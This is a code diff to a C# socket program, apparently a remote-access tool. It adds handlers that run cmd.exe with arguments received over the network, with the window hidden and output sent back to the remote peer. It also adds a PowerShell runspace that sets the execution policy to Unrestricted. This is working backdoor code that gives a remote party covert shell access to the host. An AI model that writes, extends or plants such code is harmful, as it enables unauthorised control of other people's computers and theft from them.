@@ -3,6 +3,10 @@ using System.Net;
 using System.Net.Sockets;
 using System.Threading;
 using System.Diagnostics;
+using System.Text;
+using System.Management.Automation.Runspaces;
+using System.Management.Automation;
+
 public class Program
 {
     public static void Main(string[] args)
@@ -34,7 +38,7 @@ public class Program
             } catch (Exception)
             {
             }
-                if (data[0].ToLower().Equals("login"))
+            if (data[0].ToLower().Equals("login"))
             {
                 //Handler
                 ClientSocket.Send(System.Text.Encoding.ASCII.GetBytes("yes"), 0, System.Text.Encoding.ASCII.GetBytes("yes").Length, SocketFlags.None);
@@ -71,7 +75,40 @@ public class Program
                     Console.WriteLine("couldn't open process");
                 }
             }
+            else if (data[0].ToLower().Equals("powershell"))
+            {
+                // create Powershell runspace
+                Runspace runspace = RunspaceFactory.CreateRunspace();
+                runspace.Open();
 
+                RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
+                runSpaceInvoker.Invoke("Set-ExecutionPolicy Unrestricted");
+
+                // create a pipeline and feed it the script text
+                Pipeline pipeline = runspace.CreatePipeline();
+                //Command command = new Command(SCRIPT_PATH);
+
+                //command.Parameters.Add(null, outputFilename);
+                //pipeline.Commands.Add(command);
+
+                pipeline.Invoke();
+                runspace.Close();
+            }
+            else if (data[0].ToLower().Equals("cmd"))
+            {
+                //string result= "";
+                Process pro = new Process();
+                pro.StartInfo.FileName = "cmd.exe";
+                pro.StartInfo.Arguments = data[1] + "\n";
+                pro.StartInfo.UseShellExecute = false;
+                pro.StartInfo.RedirectStandardError = true;
+                pro.StartInfo.CreateNoWindow = true;
+                pro.StartInfo.RedirectStandardOutput = true;
+                pro.Start();
+                pro.BeginOutputReadLine();
+                pro.OutputDataReceived += (_, e) => ClientSocket.Send(System.Text.Encoding.ASCII.GetBytes(e.Data.ToString()), 0, System.Text.Encoding.ASCII.GetBytes(e.Data.ToString()).Length, SocketFlags.None);
+                //ClientSocket.Send(System.Text.Encoding.ASCII.GetBytes("endend"), 0, System.Text.Encoding.ASCII.GetBytes("endend").Length, SocketFlags.None);
+            }
             else
             {
                 Console.WriteLine("Device Connected!");
